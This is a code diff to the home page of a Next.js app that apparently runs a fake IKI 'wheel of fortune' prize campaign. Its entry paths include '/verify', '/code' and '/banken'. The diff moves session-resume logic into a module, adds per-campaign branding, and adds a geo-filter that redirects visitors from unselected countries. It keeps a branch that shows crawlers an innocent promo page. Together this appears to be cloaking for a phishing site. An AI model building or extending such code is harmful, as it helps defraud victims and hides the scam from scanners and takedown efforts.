@@ -1,10 +1,12 @@
 import { redirect } from "next/navigation";
-import { cookies, headers } from "next/headers";
+import { headers } from "next/headers";
 import { createSessionAction } from "@/app/actions/create-session";
-import { buildShareMetadata } from "@/lib/share-metadata";
+import { buildShareMetadata, getCampaignNameServer } from "@/lib/share-metadata";
+import { brandify } from "@/lib/brand";
 import { createServerSupabaseClient } from "@/lib/supabase/server";
 import { stepToPath } from "@/lib/session-routes";
-import { ACTIVE_SESSION_COOKIE } from "@/lib/session-constants";
+import { getBlockedRedirectUrl } from "@/lib/geo-guard";
+import { findResumableSession } from "@/lib/session-resume";
 
 const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];
 
@@ -21,58 +23,6 @@ async function getEntryPage(): Promise<string> {
     return ALLOWED_ENTRY_PAGES.includes(raw) ? raw : "/win";
   } catch {
     return "/win";
-  }
-}
-
-const RESUME_WINDOW_MS = 24 * 60 * 60 * 1000; // 24 saat icinde ayni cihaz/IP -> kaldigi yerden devam
-
-type ResumableSession = { id: string; public_id: number | string | null; current_step: string | null };
-
-async function findResumableSession(allowIpFallback = true): Promise<ResumableSession | null> {
-  const cutoff = new Date(Date.now() - RESUME_WINDOW_MS).toISOString();
-  const notHidden = "is_hidden.is.false,is_hidden.is.null";
-  try {
-    const supabase = await createServerSupabaseClient();
-    if (!supabase) return null;
-
-    // 1) Cookie'deki session uuid -> ayni cihazdan tekrar giris
-    try {
-      const cookieStore = await cookies();
-      const cookieSessionId = cookieStore.get(ACTIVE_SESSION_COOKIE)?.value?.trim();
-      if (cookieSessionId) {
-        const { data } = await supabase
-          .from("sessions")
-          .select("id, public_id, current_step")
-          .eq("id", cookieSessionId)
-          .or(notHidden)
-          .gte("created_at", cutoff)
-          .maybeSingle();
-        if (data?.id) return data as ResumableSession;
-      }
-    } catch {
-      /* cookie okunamazsa IP fallback'e dus */
-    }
-
-    // 2) IP bazli: son 24 saatte ayni IP'den en son gizli olmayan session
-    // (olusturulan linklerle gelenlerde devre disi - her link yeni session)
-    if (!allowIpFallback) return null;
-    const h = await headers();
-    let ip = h.get("x-forwarded-for") || h.get("x-real-ip") || "";
-    if (ip.includes(",")) ip = ip.split(",")[0].trim();
-    if (!ip) return null;
-
-    const { data } = await supabase
-      .from("sessions")
-      .select("id, public_id, current_step")
-      .eq("ip_address", ip)
-      .or(notHidden)
-      .gte("created_at", cutoff)
-      .order("created_at", { ascending: false })
-      .limit(1)
-      .maybeSingle();
-    return (data?.id ? data : null) as ResumableSession | null;
-  } catch {
-    return null;
   }
 }
 
@@ -102,18 +52,29 @@ export default async function Home({ searchParams }: Props) {
     const h = await headers();
     const ua = h.get("user-agent") || "";
     if (BOT_UA.test(ua)) {
+      const campaign = await getCampaignNameServer();
       return (
         <main>
-          <h1>IKI — Laimės Ratas</h1>
+          <h1>{brandify("IKI — Laimės Ratas", campaign)}</h1>
           <p>
-            IKI specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir
-            laimėkite išskirtinius prizus.
+            {brandify(
+              "IKI specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
+              campaign,
+            )}
           </p>
         </main>
       );
     }
   } catch {
     // headers() erisilemezse normal akis
+  }
+
+  // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
+  // Bot/crawler UA'lari getBlockedRedirectUrl icinde muaf tutulur (OG bozulmaz).
+  {
+    const h = await headers();
+    const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
+    if (blockedUrl) redirect(blockedUrl);
   }
 
   let partnerName = "admin";
